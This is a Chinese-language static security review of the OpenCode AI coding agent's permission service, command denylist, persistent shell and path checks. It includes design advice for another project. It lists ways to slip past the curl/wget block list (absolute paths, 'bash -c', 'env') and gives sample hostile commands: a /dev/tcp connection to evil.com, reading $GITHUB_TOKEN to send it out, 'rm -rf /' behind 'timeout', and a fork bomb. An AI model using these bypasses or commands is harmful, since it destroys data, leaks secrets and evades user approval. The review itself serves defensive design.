# Deep Dive 2: Permission + Persistent Shell Security Boundary

> L3 Mechanism #2 | commit `73ee493265acf15fcd8caab2bc8cd3bd375b63cb`
> Method: 静态源码分析（无运行时 fuzz / 渗透）

## 1. Executive Summary

OpenCode 没有 OS-level sandbox、没有容器隔离、没有网络沙箱。它**唯一的安全边界**由三部分组成：

1. **Permission Service** — tool 执行前 request，UI 弹 dialog，sync.Map + channel 等待响应。
2. **Bash command denylist** — 第一 token 黑名单 + safe-readonly 白名单。
3. **Persistent Shell** — 进程级 singleton，env/cwd 跨调用持久。

这一组合提供了**最低限度**的安全隔离，但同时存在**多个静态发现的弱点**：

- Permission channel 无 timeout。
- `sessionPermissions` / `autoApproveSessions` 无锁。
- Non-interactive 模式**自动批准所有权限**。
- Persistent shell 共享 env + cwd + `eval` 执行任意命令。
- 路径判断用字符串前缀，不是真正的目录包含。

RoboThree 借鉴时必须**只采纳 Permission 的同步等待 + cancel 语义**，**必须拒绝** Persistent Shell 实现 + AutoApprove 模式 + 无 timeout channel。

## 2. Permission Service

### 2.1 数据结构

**[F]** [internal/permission/permission.go:25-50](../../sources/opencode/internal/permission/permission.go#L25-L50)：

```go
type PermissionRequest struct {
    ID          string `json:"id"`
    SessionID   string `json:"session_id"`
    ToolName    string `json:"tool_name"`
    Description string `json:"description"`
    Action      string `json:"action"`
    Params      any    `json:"params"`
    Path        string `json:"path"`
}

type permissionService struct {
    *pubsub.Broker[PermissionRequest]
    sessionPermissions  []PermissionRequest
    pendingRequests     sync.Map
    autoApproveSessions []string
}
```

### 2.2 Request 完整流程

**[F]** [internal/permission/permission.go:74-108](../../sources/opencode/internal/permission/permission.go#L74-L108)：

```go
func (s *permissionService) Request(opts CreatePermissionRequest) bool {
    // 1. Non-Interactive AutoApprove 短路
    if slices.Contains(s.autoApproveSessions, opts.SessionID) {
        return true
    }

    // 2. 计算 directory（如果 path 为空则取 cwd）
    dir := filepath.Dir(opts.Path)
    if dir == "." {
        dir = config.WorkingDirectory()
    }
    permission := PermissionRequest{
        ID:          uuid.New().String(),
        Path:        dir,
        SessionID:   opts.SessionID,
        ToolName:    opts.ToolName,
        Description: opts.Description,
        Action:      opts.Action,
        Params:      opts.Params,
    }

    // 3. 检查 sessionPermissions 命中
    for _, p := range s.sessionPermissions {
        if p.ToolName == permission.ToolName &&
            p.Action == permission.Action &&
            p.SessionID == permission.SessionID &&
            p.Path == permission.Path {
            return true
        }
    }

    // 4. 注册 pending request
    respCh := make(chan bool, 1)
    s.pendingRequests.Store(permission.ID, respCh)
    defer s.pendingRequests.Delete(permission.ID)

    // 5. 发布 pubsub event
    s.Publish(pubsub.CreatedEvent, permission)

    // 6. 阻塞等待响应（**无 timeout**）
    resp := <-respCh
    return resp
}
```

### 2.3 Grant / GrantPersistant / Deny

**[F]** [internal/permission/permission.go:52-72](../../sources/opencode/internal/permission/permission.go#L52-L72)：

```go
func (s *permissionService) GrantPersistant(permission PermissionRequest) {
    respCh, ok := s.pendingRequests.Load(permission.ID)
    if ok {
        respCh.(chan bool) <- true
    }
    s.sessionPermissions = append(s.sessionPermissions, permission)  // 内存追加
}

func (s *permissionService) Grant(permission PermissionRequest) {
    respCh, ok := s.pendingRequests.Load(permission.ID)
    if ok {
        respCh.(chan bool) <- true
    }
}

func (s *permissionService) Deny(permission PermissionRequest) {
    respCh, ok := s.pendingRequests.Load(permission.ID)
    if ok {
        respCh.(chan bool) <- false
    }
}
```

### 2.4 Non-Interactive AutoApprove

**[F]** [internal/app/app.go:129](../../sources/opencode/internal/app/app.go#L129)：

```go
a.Permissions.AutoApproveSession(sess.ID)
```

**[F]** [internal/permission/permission.go:110-112](../../sources/opencode/internal/permission/permission.go#L110-L112)：

```go
func (s *permissionService) AutoApproveSession(sessionID string) {
    s.autoApproveSessions = append(s.autoApproveSessions, sessionID)
}
```

**[I]** **关键安全后果**：

- `opencode -p "..."` 一次性模式中，`--prompt` 标志触发 `app.RunNonInteractive`，在调用 `agent.Run` 之前**自动批准该 session 的所有 permission**。
- 模型生成的任何 bash / write / fetch / mcp 调用都不再询问用户。
- 仅进程内 session（不在 list 中）受影响；其他 session 行为不变。

### 2.5 TUI Dialog 路径

**[F]** [internal/tui/tui.go:274-289](../../sources/opencode/internal/tui/tui.go#L274-L289)：

```go
case pubsub.Event[permission.PermissionRequest]:
    a.showPermissions = true
    return a, a.permissions.SetPermissions(msg.Payload)
case dialog.PermissionResponseMsg:
    var cmd tea.Cmd
    switch msg.Action {
    case dialog.PermissionAllow:
        a.app.Permissions.Grant(msg.Permission)
    case dialog.PermissionAllowForSession:
        a.app.Permissions.GrantPersistant(msg.Permission)
    case dialog.PermissionDeny:
        a.app.Permissions.Deny(msg.Permission)
    }
    a.showPermissions = false
    return a, cmd
```

**[I]** **3 种响应**：

- `Allow` — 仅本次同意。
- `AllowForSession` — 写入 `sessionPermissions`，后续同 (ToolName, Action, SessionID, Path) 直接放行。
- `Deny` — 返回 false；Tool 执行收到 `ErrorPermissionDenied`，触发同批取消。

### 2.6 静态发现的弱点

**[I]** 1. **`sessionPermissions` / `autoApproveSessions` 无锁保护**（[permission.go:47-50](../../sources/opencode/internal/permission/permission.go#L47-L50)）：

```go
sessionPermissions  []PermissionRequest  // 多 goroutine append
autoApproveSessions []string              // 多 goroutine append
```

- 多 session 同时 grant 时可能 data race。
- `slices.Contains` 遍历时如果其他 goroutine append，可能 panic（concurrent read/write to slice）。
- `go test -race` 几乎肯定会报错。

**[I]** 2. **Permission channel 无 timeout / context select**（[permission.go:106](../../sources/opencode/internal/permission/permission.go#L106)）：

```go
// Wait for the response with a timeout   ← 注释与实现不一致
resp := <-respCh
```

- 注释承诺 timeout，实际无超时机制。
- 如果 TUI 进程崩溃 / 用户关闭 dialog / headless 场景，**tool 永久阻塞**直到 `genCtx` 被 cancel。
- 没有 watchdog goroutine 清理 stale pendingRequests。
- 长时间运行后 `pendingRequests` sync.Map 残留悬挂 ID（虽然 defer delete）。

**[I]** 3. **Grant 时 Load 失败 silent return**（[permission.go:53-72](../../sources/opencode/internal/permission/permission.go#L53-L72)）：

```go
respCh, ok := s.pendingRequests.Load(permission.ID)
if ok {
    respCh.(chan bool) <- true
}
```

- 如果 pending request 已被删除（其他路径 cancel），`Load` 返回 `ok=false`。
- Grant 静默 return；但 `GrantPersistant` 仍把 permission append 到 `sessionPermissions`，造成"未来 session 可能被错误授权"。

**[I]** 4. **`Path` 是 directory，不是 file**（[permission.go:78-81](../../sources/opencode/internal/permission/permission.go#L78-L81)）：

```go
dir := filepath.Dir(opts.Path)
if dir == "." { dir = config.WorkingDirectory() }
```

- 一个 directory 的授权**覆盖该目录下所有子路径**。
- 模型可以先 grant `/tmp`，再写入 `/tmp/etc/passwd`。

## 3. Bash Command Allowlist / Denylist

### 3.1 Denylist

**[F]** [internal/llm/tools/bash.go:41-45](../../sources/opencode/internal/llm/tools/bash.go#L41-L45)：

```go
var bannedCommands = []string{
    "alias", "curl", "curlie", "wget", "axel", "aria2c",
    "nc", "telnet", "lynx", "w3m", "links", "httpie", "xh",
    "http-prompt", "chrome", "firefox", "safari",
}
```

**[F]** [bash.go:246-251](../../sources/opencode/internal/llm/tools/bash.go#L246-L251)：

```go
baseCmd := strings.Fields(params.Command)[0]
for _, banned := range bannedCommands {
    if strings.EqualFold(baseCmd, banned) {
        return NewTextErrorResponse(fmt.Sprintf("command '%s' is not allowed", baseCmd)), nil
    }
}
```

### 3.2 Safe-Readonly Whitelist

**[F]** [bash.go:47-55](../../sources/opencode/internal/llm/tools/bash.go#L47-L55)：

```go
var safeReadOnlyCommands = []string{
    "ls", "echo", "pwd", "date", "cal", "uptime", "whoami", "id", "groups", "env", "printenv", "set", "unset", "which", "type", "whereis",
    "whatis", "uname", "hostname", "df", "du", "free", "top", "ps", "kill", "killall", "nice", "nohup", "time", "timeout",

    "git status", "git log", "git diff", "git show", "git branch", "git tag", "git remote", "git ls-files", "git ls-remote",
    "git rev-parse", "git config --get", "git config --list", "git describe", "git blame", "git grep", "git shortlog",

    "go version", "go help", "go list", "go env", "go doc", "go vet", "go fmt", "go mod", "go test", "go build", "go run", "go install", "go clean",
}
```

**[F]** [bash.go:253-263](../../sources/opencode/internal/llm/tools/bash.go#L253-L263)：

```go
isSafeReadOnly := false
cmdLower := strings.ToLower(params.Command)
for _, safe := range safeReadOnlyCommands {
    if strings.HasPrefix(cmdLower, strings.ToLower(safe)) {
        if len(cmdLower) == len(safe) || cmdLower[len(safe)] == ' ' || cmdLower[len(safe)] == '-' {
            isSafeReadOnly = true
            break
        }
    }
}
```

**[I]** **判断逻辑**：

- safe = "ls"，则 "ls" / "ls -la" / "lsfoo" 都会**命中**（`len(cmdLower) == len(safe)` 或 cmdLower[len(safe)] == ' ' 或 '-'）。
- safe = "git status"，则 "git status -s" 命中；但 "git statusbar" 也命中（因为没有空格分隔）。
- safe 命令**直接执行**，不走 permission。
- 非 safe 命令**必须**走 permission。

### 3.3 Permission 调用

**[F]** [bash.go:265-285](../../sources/opencode/internal/llm/tools/bash.go#L265-L285)：

```go
sessionID, messageID := GetContextValues(ctx)
if sessionID == "" || messageID == "" {
    return ToolResponse{}, fmt.Errorf("session ID and message ID are required for creating a new file")
}
if !isSafeReadOnly {
    p := b.permissions.Request(
        permission.CreatePermissionRequest{
            SessionID:   sessionID,
            Path:        config.WorkingDirectory(),
            ToolName:    BashToolName,
            Action:      "execute",
            Description: fmt.Sprintf("Execute command: %s", params.Command),
            Params: BashPermissionsParams{Command: params.Command},
        },
    )
    if !p { return ToolResponse{}, permission.ErrorPermissionDenied }
}
```

### 3.4 静态发现的弱点

**[I]** 1. **Denylist 只检查第一 token**：

```go
baseCmd := strings.Fields(params.Command)[0]
```

- 绕过示例（不会被 ban）：
  - `/usr/bin/curl ...` — 绝对路径（`baseCmd = "/usr/bin/curl"`，不等于 "curl"）。
  - `$(which curl) ...` — 命令替换。
  - `bash -c "curl ..."` — `baseCmd = "bash"`，不在 denylist。
  - `env curl ...` — `baseCmd = "env"`。
  - `(curl ...)` — 子 shell（`baseCmd = "(curl"`？取决于 strings.Fields 分词）。
  - 函数定义后调用：`dangerous_func(){ curl ... }; dangerous_func` — `baseCmd = "dangerous_func(){`。

**[I]** 2. **Safe Whitelist 误判**：

- "lsfoo" / "ls-anything" 命中 safe list → 不走 permission。
- 这是字符串前缀判断的固有缺陷。
- RoboThree 必须改用 `argv[0]` 精确匹配 + 白名单由 shell 内置名集合定义。

**[I]** 3. **kill / killall / nohup 在 safe list**：

- 模型可以 `kill -9 1`（PID 1 是 init），或者 `killall nginx`。
- 这些是**破坏性命令**，误判为 safe-readonly。

**[I]** 4. **timeout / time / kill / killall 等命令同时是 safe 但有副作用**：

- `timeout 10 rm -rf /` — `baseCmd = "timeout"`，safe，permission 跳过，shell 执行删除。
- 这种"safe wrapper + dangerous payload"模型无法用字符串前缀防御。

## 4. Persistent Shell

### 4.1 Singleton 模式

**[F]** [internal/llm/tools/shell/shell.go:42-58](../../sources/opencode/internal/llm/tools/shell/shell.go#L42-L58)：

```go
var (
    shellInstance     *PersistentShell
    shellInstanceOnce sync.Once
)

func GetPersistentShell(workingDir string) *PersistentShell {
    shellInstanceOnce.Do(func() {
        shellInstance = newPersistentShell(workingDir)
    })
    if shellInstance == nil {
        shellInstance = newPersistentShell(workingDir)
    } else if !shellInstance.isAlive {
        shellInstance = newPersistentShell(shellInstance.cwd)
    }
    return shellInstance
}
```

### 4.2 启动

**[F]** [shell.go:61-130](../../sources/opencode/internal/llm/tools/shell/shell.go#L61-L130)：

```go
func newPersistentShell(cwd string) *PersistentShell {
    cfg := config.Get()
    var shellPath string
    var shellArgs []string
    if cfg != nil {
        shellPath = cfg.Shell.Path
        shellArgs = cfg.Shell.Args
    }
    if shellPath == "" {
        shellPath = os.Getenv("SHELL")
        if shellPath == "" {
            shellPath = "/bin/bash"
        }
    }
    if len(shellArgs) == 0 {
        shellArgs = []string{"-l"}    // login shell 加载 .profile / .bashrc
    }

    cmd := exec.Command(shellPath, shellArgs...)
    cmd.Dir = cwd

    stdinPipe, err := cmd.StdinPipe()
    if err != nil { return nil }

    cmd.Env = append(os.Environ(), "GIT_EDITOR=true")    // 继承全部 env

    err = cmd.Start()
    if err != nil { return nil }

    shell := &PersistentShell{
        cmd:          cmd,
        stdin:        stdinPipe.(*os.File),
        isAlive:      true,
        cwd:          cwd,
        commandQueue: make(chan *commandExecution, 10),
    }

    go func() { shell.processCommands() }()
    go func() {
        err := cmd.Wait()
        if err != nil { /* log */ }
        shell.isAlive = false
        close(shell.commandQueue)
    }()
    return shell
}
```

### 4.3 命令执行（eval 注入）

**[F]** [shell.go:139-244](../../sources/opencode/internal/llm/tools/shell/shell.go#L139-L244)：

```go
func (s *PersistentShell) execCommand(command string, timeout time.Duration, ctx context.Context) commandResult {
    s.mu.Lock()
    defer s.mu.Unlock()
    if !s.isAlive { /* error */ }

    tempDir := os.TempDir()
    stdoutFile := filepath.Join(tempDir, fmt.Sprintf("opencode-stdout-%d", time.Now().UnixNano()))
    stderrFile := filepath.Join(tempDir, fmt.Sprintf("opencode-stderr-%d", time.Now().UnixNano()))
    statusFile := filepath.Join(tempDir, fmt.Sprintf("opencode-status-%d", time.Now().UnixNano()))
    cwdFile   := filepath.Join(tempDir, fmt.Sprintf("opencode-cwd-%d", time.Now().UnixNano()))

    defer func() {
        os.Remove(stdoutFile)
        os.Remove(stderrFile)
        os.Remove(statusFile)
        os.Remove(cwdFile)
    }()

    fullCommand := fmt.Sprintf(`
eval %s < /dev/null > %s 2> %s
EXEC_EXIT_CODE=$?
pwd > %s
echo $EXEC_EXIT_CODE > %s
`, shellQuote(command), shellQuote(stdoutFile), shellQuote(stderrFile), shellQuote(cwdFile), shellQuote(statusFile))

    _, err := s.stdin.Write([]byte(fullCommand + "\n"))
    if err != nil { /* error */ }

    interrupted := false
    startTime := time.Now()
    done := make(chan bool)
    go func() {
        for {
            select {
            case <-ctx.Done():
                s.killChildren()
                interrupted = true
                done <- true
                return
            case <-time.After(10 * time.Millisecond):
                if fileExists(statusFile) && fileSize(statusFile) > 0 {
                    done <- true
                    return
                }
                if timeout > 0 {
                    elapsed := time.Since(startTime)
                    if elapsed > timeout {
                        s.killChildren()
                        interrupted = true
                        done <- true
                        return
                    }
                }
            }
        }
    }()
    <-done

    stdout := readFileOrEmpty(stdoutFile)
    stderr := readFileOrEmpty(stderrFile)
    exitCodeStr := readFileOrEmpty(statusFile)
    newCwd := readFileOrEmpty(cwdFile)

    exitCode := 0
    if exitCodeStr != "" {
        fmt.Sscanf(exitCodeStr, "%d", &exitCode)
    } else if interrupted {
        exitCode = 143
        stderr += "\nCommand execution timed out or was interrupted"
    }

    if newCwd != "" {
        s.cwd = strings.TrimSpace(newCwd)
    }
    return commandResult{stdout, stderr, exitCode, interrupted}
}
```

### 4.4 shellQuote（命令转义）

**[F]** [shell.go:304-306](../../sources/opencode/internal/llm/tools/shell/shell.go#L304-L306)：

```go
func shellQuote(s string) string {
    return "'" + strings.ReplaceAll(s, "'", "'\\''") + "'"
}
```

**[I]** **shellQuote 评估**：

- 使用单引号包裹，替换 `'` 为 `'\''`，是 shell 安全 quote 标准做法。
- 但随后整段命令仍被 `eval` 包裹（[shell.go:164](../../sources/opencode/internal/llm/tools/shell/shell.go#L164) `eval %s ...`）。
- 即使 quote 正确，`eval` 仍允许**变量展开**（`$HOME`、`${IFS}`）和**命令替换**（`$()`）。
- 例如 `echo '$(rm -rf /)'` 在 eval 下仍会执行 `rm -rf /`。

### 4.5 killChildren

**[F]** [shell.go:246-269](../../sources/opencode/internal/llm/tools/shell/shell.go#L246-L269)：

```go
func (s *PersistentShell) killChildren() {
    if s.cmd == nil || s.cmd.Process == nil { return }

    pgrepCmd := exec.Command("pgrep", "-P", fmt.Sprintf("%d", s.cmd.Process.Pid))
    output, err := pgrepCmd.Output()
    if err != nil { return }

    for pidStr := range strings.SplitSeq(string(output), "\n") {
        if pidStr = strings.TrimSpace(pidStr); pidStr != "" {
            var pid int
            fmt.Sscanf(pidStr, "%d", &pid)
            if pid > 0 {
                proc, err := os.FindProcess(pid)
                if err == nil {
                    proc.Signal(syscall.SIGTERM)
                }
            }
        }
    }
}
```

**[I]** **killChildren 弱点**：

- `pgrep -P` 只查**直接子进程**，不递归。
- 孙子进程成为孤儿，继续运行直到自然结束或系统重启。
- 杀进程用 SIGTERM，**不杀进程组**；shell 子进程可以 trap SIGTERM 拒绝退出。
- 没有 `kill -9` fallback。

### 4.6 静态发现的安全弱点

**[I]** 1. **持久状态**：

- cwd 跨调用变化（如果模型 `cd /tmp`，后续命令在 /tmp 运行）。
- 环境变量跨调用持久（export 持久）。
- 命令历史跨调用持久。
- Alias / function / sourced script 持久。
- 这是 Bash tool 设计选择，但**等同于让模型对 shell 有完整 read-write**。

**[I]** 2. **eval 等价于无沙箱**：

- `eval <quoted command>` 让模型可以运行任何 shell 命令。
- 单引号 quote 阻止直接注入；但允许变量展开、命令替换、heredoc。
- 配合 deny list 只能阻挡"已知黑名单"，无法阻止创造性组合。

**[I]** 3. **环境变量泄露**：

- `cmd.Env = append(os.Environ(), "GIT_EDITOR=true")`（[shell.go:94](../../sources/opencode/internal/llm/tools/shell/shell.go#L94)）。
- 父进程的所有环境变量（包括 AWS_ACCESS_KEY_ID、GITHUB_TOKEN、SSH_AUTH_SOCK 等）暴露给 shell。
- 模型可以用 `echo $GITHUB_TOKEN` 读取，然后写入文件 / 通过 fetch 外发。

**[I]** 4. **没有网络沙箱**：

- `curl` / `wget` 在 denylist，但 `bash -c 'exec 3<>/dev/tcp/evil.com/80'` 不在。
- `python -c "import socket"` 可发起任意 TCP。
- 模型可以用任意合法命令组合建立 reverse shell / DNS exfiltration。

**[I]** 5. **没有文件系统边界**：

- `cat /etc/passwd` 不在 deny / safe list（不在 safe，因此走 permission，但 bash 是万能的）。
- `chmod 777 /` / `rm -rf /` 都可以跑（permission 弹 dialog，但 persistent shell 是用户信任的）。

**[I]** 6. **没有 resource 限制**：

- fork bomb `:(){ :|:& };:` 可瞬间耗尽 PID。
- `dd if=/dev/zero of=/tmp/x bs=1G count=100` 可吃满磁盘。
- 没有 ulimit / cgroup / rlimit。

## 5. Path Permission 字符串前缀

**[F]** [internal/llm/tools/write.go:164-168](../../sources/opencode/internal/llm/tools/write.go#L164-L168)：

```go
rootDir := config.WorkingDirectory()
permissionPath := filepath.Dir(filePath)
if strings.HasPrefix(filePath, rootDir) {
    permissionPath = rootDir
}
p := w.permissions.Request(
    permission.CreatePermissionRequest{
        SessionID:   sessionID,
        Path:        permissionPath,
        ToolName:    WriteToolName,
        Action:      "write",
        Description: fmt.Sprintf("Create file %s", filePath),
        Params: WritePermissionsParams{
            FilePath: filePath,
            Diff:     diff,
        },
    },
)
```

**[I]** **路径前缀误判**：

- `rootDir = /workspace/project`。
- `filePath = /workspace/project2/file.txt`。
- `strings.HasPrefix("/workspace/project2/file.txt", "/workspace/project")` → **true**。
- 结果：`permissionPath = rootDir = /workspace/project`。
- 用户授权 `/workspace/project` 后，`GrantPersistant` 写入 `sessionPermissions`，后续**所有以 `/workspace/project` 开头的路径**都被放行，包括 `/workspace/project2/...`、`/workspace/projectile/...` 等。

**[I]** **RoboThree 必须改用**：

```go
rel, err := filepath.Rel(rootDir, filePath)
if err != nil || strings.HasPrefix(rel, "..") {
    // filePath 不在 rootDir 下
    return permission_denied
}
```

- 或维护显式 allowlist 路径集合。
- 加 `os.Lstat` 检查符号链接（[opencode/.../fetch.go](../../sources/opencode/internal/llm/tools/fetch.go) 没用，但 file write 应该）。
- 类似 Claude Code 的 `O_NOFOLLOW | O_EXCL` 五道防线（已在 [claude-code-best](../../research/claude-code-best/) L3 中识别）。

## 6. File Read/Write Mtime Check

**[F]** [internal/llm/tools/write.go:125-130](../../sources/opencode/internal/llm/tools/write.go#L125-L130)：

```go
modTime := fileInfo.ModTime()
lastRead := getLastReadTime(filePath)
if modTime.After(lastRead) {
    return NewTextErrorResponse(fmt.Sprintf("File %s has been modified since it was last read..."), nil)
}
```

**[I]** **Mtime Check 作用**：

- 强制模型"先 Read 才能 Write"。
- 如果用户在对话中外部修改文件，模型不能盲目覆盖。
- 但**不影响安全**，只是数据完整性保护。
- 适合 RoboThree 借鉴。

**[F]** [internal/llm/tools/edit.go:120-170](../../sources/opencode/internal/llm/tools/edit.go#L120-L170) 也有 mtime check + 强制 old_string 唯一。

## 7. Network Fetch Tool

**[F]** [internal/llm/tools/fetch.go:99-203](../../sources/opencode/internal/llm/tools/fetch.go#L99-L203)：

- 只允许 `http://` 和 `https://`。
- 30 秒默认 timeout，用户参数最多 120 秒。
- 只接受 HTTP 200。
- 最多读取 5MB。
- 支持 text / markdown / html。
- 使用 `http.NewRequestWithContext` 跟随 Agent context 取消。

**[I]** **Network Fetch 弱点**：

- 默认 30 秒，可调到 120 秒。
- 5MB 上限可放宽（用户参数）。
- 任意 HTTPS endpoint 可达（包括内网 metadata 服务）。
- 没有 DNS 拦截或域名 allowlist。

## 8. RoboThree 安全边界设计建议

### 8.1 ADOPT

| 机制 | 适配方案 |
|---|---|
| Permission Service 同步等待 + cancel 语义 | 采纳；加 timeout + context select |
| session-level grant memory cache | 改为持久化到 SQLite |
| File mtime check before write | 直接采纳 |
| TUI Dialog 三选项（Allow / AllowForSession / Deny） | 直接采纳 |
| MCP tool 也走 permission | 直接采纳 |

### 8.2 ADAPT

| 机制 | 适配方案 |
|---|---|
| Denylist (bannedCommands) | 改为 syscall-level deny + macOS sandbox-exec / Linux bubblewrap |
| Safe-readonly whitelist | 改为 argv[0] 精确匹配 + 强类型 `SafeCommand` enum |
| Path permission | 改用 `filepath.Rel` + 显式 allowlist |
| Non-Interactive 默认拒绝；提供 `--allow-read-only` 显式 flag | 调整 |

### 8.3 REJECT

| 机制 | 理由 |
|---|---|
| PersistentShell singleton | 等价于无沙箱；RoboThree 必须 fork 新进程 |
| `eval <quoted>` | 等价于无沙箱；RoboThree 必须直接执行 argv，不经 shell |
| 继承全部 os.Environ() | 泄露 Secret；RoboThree 必须白名单 env |
| sessionPermissions / autoApproveSessions 无锁 | data race；RoboThree 必须加 mutex |
| Permission channel 无 timeout | 永久阻塞风险；RoboThree 必须加 timeout + context select |
| AutoApproveSession 全量 | 安全 / 便利失衡；RoboThree 必须禁止 |
| 字符串前缀判断 path | 误判；RoboThree 必须 `filepath.Rel` |

### 8.4 NEEDS_MORE_EVIDENCE

| 机制 | 缺失证据 |
|---|---|
| PersistentShell 是否真的持久 env | 需运行时验证 |
| shellQuote 是否真的防注入 | 需 fuzz 测试 |
| killChildren 孙子进程残留比例 | 需 runtime 验证 |

## 9. 引用完整列表

| 路径 | 用途 |
|---|---|
| [internal/permission/permission.go](../../sources/opencode/internal/permission/permission.go) | Permission Service 完整实现 |
| [internal/llm/tools/bash.go](../../sources/opencode/internal/llm/tools/bash.go) | Bash command denylist / safelist / persistent shell 调用 |
| [internal/llm/tools/shell/shell.go](../../sources/opencode/internal/llm/tools/shell/shell.go) | PersistentShell 完整实现 |
| [internal/llm/tools/write.go](../../sources/opencode/internal/llm/tools/write.go) | File write + path permission + mtime check |
| [internal/llm/tools/edit.go](../../sources/opencode/internal/llm/tools/edit.go) | Edit tool + mtime + unique old_string |
| [internal/llm/tools/patch.go](../../sources/opencode/internal/llm/tools/patch.go) | Multi-file patch + fuzz level check |
| [internal/llm/tools/fetch.go](../../sources/opencode/internal/llm/tools/fetch.go) | HTTP fetch + 5MB limit |
| [internal/llm/agent/mcp-tools.go](../../sources/opencode/internal/llm/agent/mcp-tools.go) | MCP tool 也走 permission |
| [internal/tui/tui.go](../../sources/opencode/internal/tui/tui.go) | TUI permission dialog |
| [internal/app/app.go](../../sources/opencode/internal/app/app.go) | Non-interactive AutoApprove |
| [cmd/root.go](../../sources/opencode/cmd/root.go) | Cobra 启动 + MCP discovery |